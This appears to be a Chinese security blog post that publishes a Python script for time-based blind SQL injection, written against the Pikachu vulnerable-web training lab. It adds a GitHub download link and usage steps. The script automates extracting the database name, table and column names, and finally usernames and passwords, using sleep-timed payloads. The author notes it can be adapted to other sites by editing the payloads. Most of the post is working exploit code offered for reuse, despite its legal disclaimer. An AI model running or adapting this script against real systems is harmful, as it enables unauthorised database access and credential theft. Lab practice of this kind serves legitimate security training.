***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

## 一、python代码

 **以下代码可自用，未经许可不可转载**

    
    
    #!/usr/bin/python3
    # coding=utf-8
     
    """
    functions for time-based sql injection(blind)
    :copyright: Copyright (c) 2019, Fancy Xiang. All rights reserved.
    :license: GNU General Public License v3.0, see LICENSE for more details.
    """
     
    import requests
     
    url = "http://192.168.101.16/pikachu/vul/sqli/sqli_blind_t.php"               #有可利用漏洞的url，根据实际情况填写
    headers={ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36","Cookie": "PHPSESSID=7qgjcq21lsq834acodn0mo7km3",}    #http request报文头部，根据实际情况填写
     
    keylist = [chr(i) for i in range(33, 127)]                                     #包括数字、大小写字母、可见特殊字符
     
    def CurrentDatabaseTime():
        n = 10                                                                      #预测当前数据库名称最大可能的长度，根据实际情况填写
        k = 0
        j = n//2 
        length = 0
        db = str()
        while True:
            if j>k and j<n and j-k>3:
                payload1 = "lili' and  if(length(database())>"+str(j)+",sleep(3),1)-- ss"           #所有payload根据实际情况填写
                param = {
                "name":payload1,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)     #本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样
                    k=k
                    n=j     
                except:
                    n=n
                    k=j
                j=(n-k)//2
            elif j-k==3 or j-k<3:
                for i in range(k-1,n+2):
                    payload2 = "lili' and  if(length(database())="+str(i)+",sleep(3),1)-- ss"
                    param = {
                    "name":payload2,
                    "submit":"查询",
                    }
                    try:
                        response = requests.get(url, params = param, headers = headers,timeout=2)
                    except:
                        length = i
                        break
                break
            else:
                break
        print("the name of current database contains "+str(length)+" characters")
        
        for i in range(1,length+1):
            for c in keylist:
                payload3 = "lili' and if(substring(database(),"+str(i)+",1)='"+c+"',sleep(3),1)-- ss"
                param = {
                "name":payload3,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)
                except:
                    db = db+c
                    break
        print("the name of current database is "+str(db))
        
    def TablesTime():
        n = 100                                                                     #预测当前数据库中所有表名称最大可能的长度，根据实际情况填写
        k = 0
        j = n//2
        length = 0
        tname = str()
        while True:
            if j>k and j<n and j-k>3:
                payload4 = "lili' and if((length((select group_concat(table_name) from information_schema.tables where table_schema = database())))>"+str(j)+",sleep(3),1)-- ss"
                param = {
                "name":payload4,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)     #本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样
                    k=k
                    n=j     
                except:
                    n=n
                    k=j
                j=(n-k)//2
            elif j-k==3 or j-k<3:
                for i in range(k-1,n+2):
                    payload5 = "lili' and if((length((select group_concat(table_name) from information_schema.tables where table_schema = database())))="+str(i)+",sleep(3),1)-- ss"
                    param = {
                    "name":payload5,
                    "submit":"查询",
                    }
                    try:
                        response = requests.get(url, params = param, headers = headers,timeout=2)
                    except:
                        length = i
                        break
                break
            else:
                break
        print("the name of all tables in current database contains "+str(length)+" characters")
        
        for i in range(1,length+1):
            for c in keylist:
                payload6 = "lili' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),"+str(i)+",1)='"+c+"',sleep(3),1)-- ss"
                param = {
                "name":payload6,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)
                except:
                    tname = tname+c
                    break
        print("the name of all tables in current database is "+str(tname))
     
     
    def ColumnsTime():
        n = 200                                                                     #预测某个表所有列名称最大可能的长度，根据实际情况填写
        k = 0
        j = n//2
        length = 0
        cname = str()
        while True:
            if j>k and j<n and j-k>3:
                payload7 = "lili' and if((length((select group_concat(column_name) from information_schema.columns where table_name = 'users')))>"+str(j)+",sleep(3),1)-- ss"
                param = {
                "name":payload7,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)     #本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样
                    k=k
                    n=j     
                except:
                    n=n
                    k=j
                j=(n-k)//2
            elif j-k==3 or j-k<3:
                for i in range(k-1,n+2):
                    payload8 = "lili' and if((length((select group_concat(column_name) from information_schema.columns where table_name = 'users')))="+str(i)+",sleep(3),1)-- ss"
                    param = {
                    "name":payload8,
                    "submit":"查询",
                    }
                    try:
                        response = requests.get(url, params = param, headers = headers,timeout=2)
                    except:
                        length = i
                        break
                break
            else:
                break
        print("the name of all columns in current table contains "+str(length)+" characters")
        
        for i in range(1,length+1):
            for c in keylist:
                payload9 = "lili' and if(substr((select group_concat(column_name) from information_schema.columns where table_name = 'users'),"+str(i)+",1)='"+c+"',sleep(3),1)-- ss"
                param = {
                "name":payload9,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)
                except:
                    cname = cname+c
                    break
        print("the name of all columns in current table is "+str(cname))
     
    def ContentTime():
        n = 200                                                                     #预测期望获取的数据的最大可能的长度，根据实际情况填写
        k = 0
        j = n//2
        length = 0
        content = str()
        while True:
            if j>k and j<n and j-k>3:
                payload10 = "lili' and if((length((select group_concat(concat(username,'^',password)) from users)))>"+str(j)+",sleep(3),1)-- ss"
                param = {
                "name":payload10,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)     #本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样
                    k=k
                    n=j     
                except:
                    n=n
                    k=j
                j=(n-k)//2
            elif j-k==3 or j-k<3:
                for i in range(k-1,n+2):
                    payload11 = "lili' and if((length((select group_concat(concat(username,'^',password)) from users)))="+str(i)+",sleep(3),1)-- ss"
                    param = {
                    "name":payload11,
                    "submit":"查询",
                    }
                    try:
                        response = requests.get(url, params = param, headers = headers,timeout=2)
                    except:
                        length = i
                        break
                break
            else:
                break
        print("the content contains "+str(length)+" characters")
        
        for i in range(1,length+1):
            for c in keylist:
                payload12 = "lili' and if(substr((select group_concat(concat(username,'^',password)) from users),"+str(i)+",1)='"+c+"',sleep(3),1)-- ss"
                param = {
                "name":payload12,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)
                except:
                    content = content+c
                    break
        print("the content is "+str(content))

玩过pikachu漏洞靶场的有木有觉得上面的payload很熟悉？以上代码是在做pikachu的基于时间的sql盲注的过程中开发的，示例payload用的都是这个关卡相关的。

因此在其他地方使用之前需要修改payload和部分参数（见注释）。

写这个小东西的目的主要是缩短手工盲注的时间，从函数名称就能看出来，它可以实现当前数据库名称，表名称，列名称，数据库内容的爆破。

## 二、使用方法

### 1、获取

（简单方法）  
可以直接从我的github上打包下载代码，布尔盲注和时间盲注都在里面

仓库地址：[JacquelinXiang/sqli_blind: A simple tool/framework for boolean-based or
time-based sql injection(blind)
(github.com)](https://github.com/JacquelinXiang/sqli_blind)

下载链接：<https://github.com/JacquelinXiang/sqli_blind/archive/refs/heads/main.zip>

下载链接可以直接添加到各种加速网站，就不用打开github了。

下载下来的文件夹改名为sqli_blind

（复杂方法）  
step1、复制上面的代码保存为sqli_tb.py

step2、复制下面的代码保存为__init__.py

    
    
    from .sqli_tb import *

step3、以上两个python文件保存到文件夹sqli_blind中

### 2、使用

（1）确保安装了python3

（2）根据实际情况修改代码中的payload和部分参数（见注释）

（3）打开命令行，进入sql_blind文件夹的上级目录，输入python进入python3交互界面

（4）输入 from sqli_blind import *导入所有函数，然后调用函数即可，详见测试部分。

注意：每次修改代码需要退出python3交互界面，删除sqli_blind下的__pycache__文件夹，并重新进入python3交互界面from
sqli_blind import *

## 三、测试

![1620652065_6099302111fae3e5b32dd.png!small?1620652065748](https://image.3001.net/images/20210510/1620652065_6099302111fae3e5b32dd.png!small?1620652065748)

